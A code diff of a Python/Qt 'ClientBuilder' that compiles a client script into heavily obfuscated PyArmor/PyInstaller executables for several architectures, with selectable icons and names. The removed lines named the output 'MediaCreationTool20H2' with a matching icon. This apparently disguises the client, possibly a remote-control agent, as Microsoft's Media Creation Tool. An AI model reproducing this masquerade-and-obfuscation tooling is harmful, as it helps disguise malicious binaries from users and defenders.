@@ -1,58 +1,119 @@
 import os
-import sys
+import re
 import string
+import base64
 
-from qtpy.QtCore import QObject
+from qtpy.QtCore import QObject, QProcess, Signal, Slot
 
-PYINSTALLER_TEST_BUILD = string.Template("pyinstaller client.py -c -F --clean --distpath ./__dist "
-                                         "--workpath ./__build -n $name --exclude-module PyQt5 "
-                                         "--exclude-module Pyside2 --exclude-module qtpy")
-# -e pyinstaller -x pyarmor
+from core.Docker import i386Generator, Amd64Generator, Win32Generator, Win64Generator
+
 PYARMOR_DIST_BUILD = string.Template(
-    "pyarmor pack client.py --keep -n $name -e \"$pyinstaller_kwargs\" -x \"$pyarmor_kwargs\"")
+    "\"pyarmor pack client.py -n $name -e \'$pyinstaller_kwargs\' -x \'$pyarmor_kwargs\'\"")
 
-PYARMOR_PYINSTALLER_KWARGS = " -F --exclude-module shiboken2 --exclude-module PyQt5 " \
-                             "--exclude-module PySide2 --exclude-module _tkinter " \
-                             "--exclude-module tkinter --exclude-module Tkinter " \
-                             "--exclude-module qtpy -i ./resources/media_creation_icon.ico -w "
+PYARMOR_PYINSTALLER_KWARGS = string.Template(" -F --exclude-module shiboken2 --exclude-module PyQt5 "
+                                             "--exclude-module PySide2 --exclude-module _tkinter "
+                                             "--exclude-module tkinter --exclude-module Tkinter "
+                                             "--exclude-module tcl --exclude-module tk --exclude-module FixTk "
+                                             "--exclude-module qtpy -i $icon")
 
 PYARMOR_OBFUSCATE_KWARGS = " --restrict 2 --advanced 2 --wrap-mode 1 -r "
 
 
 class ClientBuilder(QObject):
-    """Create single executable for client module."""
+    build_options = Signal(int, dict)
+    build_stopped = Signal(int)
+    build_error = Signal(int, str)
+    build_finished = Signal(int)
+
+    generator_started = Signal(int, str)
+    generator_progress = Signal(int, str, str)
+    generator_finished = Signal(int, str, int)
 
     def __init__(self):
         super(ClientBuilder, self).__init__()
+        self.generators = [i386Generator, Amd64Generator, Win32Generator, Win64Generator]
+        self.running_builders = []
 
-    def make_build(self):
-        os.chdir(os.path.realpath("../client"))
-        os.system(PYARMOR_DIST_BUILD.substitute(name="MediaCreationTool20H2",
-                                                pyinstaller_kwargs=PYARMOR_PYINSTALLER_KWARGS,
-                                                pyarmor_kwargs=PYARMOR_OBFUSCATE_KWARGS))
+    @Slot(int, str, str, list)
+    def start(self, device_id, name, icon, builders):
+        if self.running_builders:
+            self.build_error.emit(device_id, "Build in progress!")
+            return
 
-    def make_test_build(self):
-        """Compiles test build."""
-        cwd = os.getcwd()
-        os.chdir(os.path.join(cwd, "../client"))
-        if cwd in sys.path:
-            sys.path.remove(cwd)
-        os.system(PYINSTALLER_TEST_BUILD.substitute(name="MediaCreationTool20H2"))
-        # subprocess.run(shlex.split(PYINSTALLER_TEST_BUILD), text=True, capture_output=True)
+        if not os.path.exists(os.path.join("./client/resources/", icon)):
+            self.build_error.emit(device_id, "Icon does not exist!")
+            return
+        else:
+            icon = os.path.join("./resources/", icon)
 
+        if not name:
+            self.build_error.emit(device_id, "Script name is not valid!")
+            return
+
+        name = str(name)
+        if not re.fullmatch("^[0-9a-zA-Z_\-. ]+$", name):  # noqa
+            self.build_error.emit(device_id, "Script name contains a disallowed characters!")
+            return
+
+        pyinstaller_kwargs = PYARMOR_PYINSTALLER_KWARGS.substitute(icon=icon)
+
+        for generator in self.generators:
+            if generator.__name__ in builders:
+                command = PYARMOR_DIST_BUILD.substitute(pyinstaller_kwargs=pyinstaller_kwargs,
+                                                        pyarmor_kwargs=PYARMOR_OBFUSCATE_KWARGS,
+                                                        name=name+"-"+generator.tag)
+
+                gen_obj = generator(self)
+                gen_obj.build_progress.connect(lambda progress, dev_id=device_id, gen_name=generator.__name__:
+                                               self.generator_progress.emit(dev_id, gen_name, progress))
+                gen_obj.build_finished.connect(lambda exit_code, dev_id=device_id, gen_name=generator.__name__:
+                                               self.on_generator_finished(dev_id, gen_name, exit_code))
+                gen_obj.build_started.connect(lambda dev_id=device_id, gen_name=generator.__name__:
+                                              self.generator_started.emit(dev_id, gen_name))
+                gen_obj.start(command)
+                self.running_builders.append(gen_obj)
+
+    @Slot(int, str, int)
+    def on_generator_finished(self, device_id, gen_name, exit_code):
+        for generator in self.running_builders:
+            if generator.__class__.__name__ == gen_name:
+                generator.setFinished(True)
+        self.generator_finished.emit(device_id, gen_name, exit_code)
+        if all(gen.isFinished() for gen in self.running_builders):
+            self.running_builders.clear()
+            self.build_finished.emit(device_id)
+
+    @Slot(int)
+    def stop(self, device_id):
+        for builder in self.running_builders:
+            builder.stop()
+            self.running_builders.remove(builder)
+        self.build_stopped.emit(device_id)
+
+    @Slot(int)
+    def get_options(self, device_id):
+        options = {"icons": [], "generators": []}
+        try:
+            for file_name in os.listdir("./client/resources/"):
+                if file_name.endswith(".ico"):
+                    with open(os.path.join("./client/resources/", file_name), "rb") as f:
+                        options["icons"].append({"name": file_name, "ico": base64.b64encode(f.read()).decode()})
+        except Exception as e:
+            self.build_error.emit(device_id, "Failed to get available icons: {}".format(e))
+            return
+        for generator in self.generators:
+            options["generators"].append(generator.__name__)
+        self.build_options.emit(device_id, options)
+
+    @Slot()
     def patch_win10toast(self):
         from pathlib import Path
         from distutils.sysconfig import get_python_lib
-        site_packages = get_python_lib()
-        hooks_path = Path(site_packages) / "Pyinstaller" / "hooks"
+        hooks_path = Path(get_python_lib()) / "Pyinstaller" / "hooks"
         if not hooks_path.exists():
-            raise FileNotFoundError("Failed to find Pyinstaller hooks directory")
+            self.build_error.emit("Failed to find Pyinstaller hooks directory")
+            return
         hooks_path = hooks_path / "hook-win10toast.py"
         with open(hooks_path, "w+") as f:
             f.write("from PyInstaller.utils.hooks import copy_metadata\n\ndatas = copy_metadata('win10toast')")
 
-
-c = ClientBuilder()
-c.patch_win10toast()
-c.make_build()
-# c.make_test_build()
